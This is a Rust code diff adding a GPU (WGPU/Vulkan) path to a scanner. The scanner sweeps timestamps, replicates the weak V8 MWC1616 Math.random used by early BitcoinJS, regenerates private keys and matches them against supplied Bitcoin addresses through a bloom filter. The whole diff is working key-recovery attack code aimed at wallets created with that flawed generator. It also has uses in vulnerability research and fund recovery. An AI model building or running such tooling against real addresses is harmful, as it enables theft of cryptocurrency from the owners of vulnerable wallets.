@@ -210,6 +210,26 @@ pub fn run_scan(
 
     // Mode selection: direct sweep if timestamps provided, else phase-based scanner.
     if let (Some(start), Some(end)) = (start_ms, end_ms) {
+        // Use GPU-accelerated sweep when --gpu is requested and wgpu feature is compiled in.
+        #[cfg(feature = "wgpu")]
+        if force_gpu || !force_cpu {
+            match gpu_direct_sweep_scan(
+                &addresses,
+                start,
+                end,
+                interval_ms,
+                output_path,
+                math_random_engine,
+                include_uncompressed,
+            ) {
+                Ok(()) => return Ok(()),
+                Err(e) => {
+                    warn!("⚠️  GPU sweep failed ({}), falling back to CPU", e);
+                }
+            }
+        }
+
+        // CPU fallback (or forced CPU)
         direct_sweep_scan(
             &addresses,
             start,
@@ -377,6 +397,172 @@ fn output_results(
         let mut stdout = std::io::stdout();
         output_results_to_writer(results, &mut stdout)
     }
+}
+
+/// GPU-accelerated direct sweep using WGPU (Vulkan/DX12).
+/// Batches timestamps into BrowserFingerprint objects, builds a bloom filter
+/// from target hash160s, and dispatches to the RTX 3080 compute shader.
+#[cfg(feature = "wgpu")]
+fn gpu_direct_sweep_scan(
+    target_addresses: &[String],
+    start_ms: u64,
+    end_ms: u64,
+    interval_ms: u64,
+    output_path: Option<&Path>,
+    engine_name: &str,
+    include_uncompressed: bool,
+) -> Result<()> {
+    use super::wgpu_integration::WgpuScanner;
+    use super::fingerprint::BrowserFingerprint;
+    use super::gpu_integration::MatchedKey;
+    use crate::utils::gpu_bloom_filter::{compute_bloom_bits, GpuBloomConfig};
+    use sha2::{Sha256, Digest};
+    use ripemd::Ripemd160;
+
+    if interval_ms == 0 { anyhow::bail!("interval_ms must be > 0"); }
+    if start_ms > end_ms { anyhow::bail!("start_ms must be <= end_ms"); }
+
+    let engine = MathRandomEngine::from_str(engine_name)
+        .unwrap_or(MathRandomEngine::V8Mwc1616);
+
+    info!("🎮 GPU Direct Sweep mode (WGPU/Vulkan)");
+    info!("   Start: {}", start_ms);
+    info!("   End:   {}", end_ms);
+    info!("   Interval: {} ms", interval_ms);
+    info!("   Targets: {}", target_addresses.len());
+
+    // --- Build bloom filter from target hash160s ---
+    let mut hash160s: Vec<Vec<u8>> = Vec::new();
+    let mut target_set: HashSet<Vec<u8>> = HashSet::new();
+
+    for addr_str in target_addresses {
+        if let Ok(addr) = Address::from_str(addr_str) {
+            let script = addr.assume_checked().script_pubkey();
+            let h160 = if script.is_p2pkh() {
+                script.as_bytes()[3..23].to_vec()
+            } else if script.is_p2sh() {
+                script.as_bytes()[2..22].to_vec()
+            } else {
+                continue;
+            };
+            hash160s.push(h160.clone());
+            target_set.insert(h160);
+        }
+    }
+
+    if hash160s.is_empty() {
+        anyhow::bail!("No valid P2PKH/P2SH addresses for GPU bloom filter");
+    }
+
+    let bloom_cfg = GpuBloomConfig::default();
+    let bloom_data = compute_bloom_bits(
+        &hash160s,
+        bloom_cfg.calculate_filter_size(),
+        15,
+    );
+
+    info!("   Bloom filter: {} bytes ({} entries)", bloom_data.len(), hash160s.len());
+
+    // --- Init GPU scanner ---
+    let config = super::config::ScanConfig {
+        use_gpu: true,
+        gpu_backend: super::config::GpuBackend::Wgpu,
+        batch_size: Some(65_536),
+        ..Default::default()
+    };
+
+    let mut wgpu = WgpuScanner::new(config, engine, None, include_uncompressed)
+        .context("Failed to init WGPU scanner for GPU sweep")?;
+
+    // --- Batch sweep ---
+    const BATCH_SIZE: usize = 65_536;
+    let total = ((end_ms.saturating_sub(start_ms)) / interval_ms) + 1;
+
+    let pb = ProgressBar::new(total);
+    pb.set_style(
+        ProgressStyle::default_bar()
+            .template("[{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} timestamps ({eta}) | GPU")
+            .unwrap()
+            .progress_chars("█>-"),
+    );
+
+    let mut matches: Vec<(u64, String)> = Vec::new();
+    let mut batch: Vec<BrowserFingerprint> = Vec::with_capacity(BATCH_SIZE);
+    let mut batch_ts: Vec<u64> = Vec::with_capacity(BATCH_SIZE);
+
+    let mut ts = start_ms;
+    while ts <= end_ms || !batch.is_empty() {
+        // Fill batch
+        while ts <= end_ms && batch.len() < BATCH_SIZE {
+            batch.push(BrowserFingerprint {
+                timestamp_ms: ts,
+                user_agent: String::new(),
+                screen_width: 1366,
+                screen_height: 768,
+                color_depth: 24,
+                timezone_offset: 0,
+                language: String::new(),
+                platform: String::new(),
+            });
+            batch_ts.push(ts);
+            ts = ts.saturating_add(interval_ms);
+        }
+
+        if batch.is_empty() { break; }
+
+        // Process on GPU
+        let result = wgpu.process_batch(&batch, &bloom_data)
+            .context("GPU batch processing failed")?;
+
+        // Verify hits on CPU (bloom filter has false positives)
+        for hit in &result.matches_found {
+            let secp = bitcoin::secp256k1::Secp256k1::new();
+            let pk = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &hit.private_key);
+
+            let addr_comp = super::derivation::derive_p2pkh_address(&pk);
+            if target_set.iter().any(|h| {
+                if let Ok(a) = Address::from_str(&addr_comp) {
+                    let s = a.assume_checked().script_pubkey();
+                    let hv = if s.is_p2pkh() { s.as_bytes()[3..23].to_vec() } else { vec![] };
+                    hv == *h
+                } else { false }
+            }) {
+                matches.push((hit.fingerprint.timestamp_ms, addr_comp));
+            }
+
+            if include_uncompressed {
+                let addr_u = super::derivation::derive_p2pkh_address_uncompressed(&pk);
+                if target_addresses.contains(&addr_u) {
+                    matches.push((hit.fingerprint.timestamp_ms, addr_u));
+                }
+            }
+        }
+
+        pb.inc(batch.len() as u64);
+        batch.clear();
+        batch_ts.clear();
+    }
+
+    pb.finish_with_message(format!(
+        "GPU sweep complete — {:.1}M keys/s",
+        (total as f64) / pb.elapsed().as_secs_f64() / 1_000_000.0
+    ));
+
+    // Write output
+    let mut writer: Box<dyn Write> = if let Some(path) = output_path {
+        Box::new(File::create(path).context("Failed to create output file")?)
+    } else {
+        Box::new(std::io::stdout())
+    };
+
+    writeln!(writer, "Timestamp,Address")?;
+    for (ts, addr) in &matches {
+        writeln!(writer, "{},{}", ts, addr)?;
+    }
+    writer.flush()?;
+
+    info!("✅ GPU Sweep complete. Matches: {}", matches.len());
+    Ok(())
 }
 
 /// Direct sweep mode: iterate timestamps and replicate BitcoinJS v0.1.3 RNG to find matches.
